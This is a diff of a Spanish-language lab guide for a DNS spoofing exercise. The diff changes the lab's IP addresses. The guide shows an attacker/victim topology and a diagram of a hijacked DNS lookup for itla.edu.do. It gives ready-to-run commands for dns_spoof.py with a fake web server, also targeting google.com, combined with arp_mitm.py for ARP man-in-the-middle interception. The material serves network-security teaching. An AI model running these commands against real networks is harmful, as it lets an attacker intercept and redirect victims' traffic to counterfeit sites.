@@ -39,16 +39,16 @@ un servidor web falso que simula el sitio objetivo.
 
 ```
 [Ubuntu-Atacante]──e0/0──[SW-Core]──e0/1──[Linux-Victima]
- 192.168.1.50                               192.168.1.10
+ 192.168.67.50                               192.168.67.60
  (DNS Falso +
   Web Falso)
 ```
 
 | Dispositivo | Interfaz | IP | Rol |
 |---|---|---|---|
-| Ubuntu-Atacante | ens3 | 192.168.1.50/24 | DNS + Web falso |
+| Ubuntu-Atacante | ens3 | 192.168.67.50/24 | DNS + Web falso |
 | SW-Core | e0/0 - e0/1 | — | Switch |
-| Linux-Victima | ens3 | 192.168.1.10/24 | Objetivo |
+| Linux-Victima | ens3 | 192.168.67.60/24 | Objetivo |
 
 ---
 
@@ -67,8 +67,8 @@ FLUJO NORMAL:
 Víctima → DNS Query "itla.edu.do?" → Servidor DNS → Respuesta: 200.10.x.x
 
 FLUJO ATACADO:
-Víctima → DNS Query "itla.edu.do?" → ATACANTE responde: 192.168.1.50
-Víctima → HTTP GET 192.168.1.50 → Servidor web FALSO del atacante
+Víctima → DNS Query "itla.edu.do?" → ATACANTE responde: 192.168.67.50
+Víctima → HTTP GET 192.168.67.50 → Servidor web FALSO del atacante
 ```
 
 ---
@@ -79,33 +79,33 @@ Víctima → HTTP GET 192.168.1.50 → Servidor web FALSO del atacante
 # Básico — solo DNS spoofing
 sudo python3 dns_spoof.py -i ens3 \
     --target itla.edu.do \
-    --redirect 192.168.1.50
+    --redirect 192.168.67.50
 
 # Con servidor web falso integrado
 sudo python3 dns_spoof.py -i ens3 \
     --target itla.edu.do \
-    --redirect 192.168.1.50 \
+    --redirect 192.168.67.50 \
     --web
 
 # Múltiples dominios
 sudo python3 dns_spoof.py -i ens3 \
     --target "itla.edu.do,google.com" \
-    --redirect 192.168.1.50 --web
+    --redirect 192.168.67.50 --web
 
 # Verificar desde la víctima
 nslookup itla.edu.do
-# Debe responder con 192.168.1.50
+# Debe responder con 192.168.67.50
 ```
 
 ## Ataque combinado con ARP MitM
 
 ```bash
 # Terminal 1: ARP MitM para interceptar tráfico
-sudo python3 arp_mitm.py -i ens3 -v 192.168.1.10 -g 192.168.1.1
+sudo python3 arp_mitm.py -i ens3 -v 192.168.67.60 -g 192.168.67.1
 
 # Terminal 2: DNS Spoofing
 sudo python3 dns_spoof.py -i ens3 --target itla.edu.do \
-    --redirect 192.168.1.50 --web
+    --redirect 192.168.67.50 --web
 ```
 
 ---
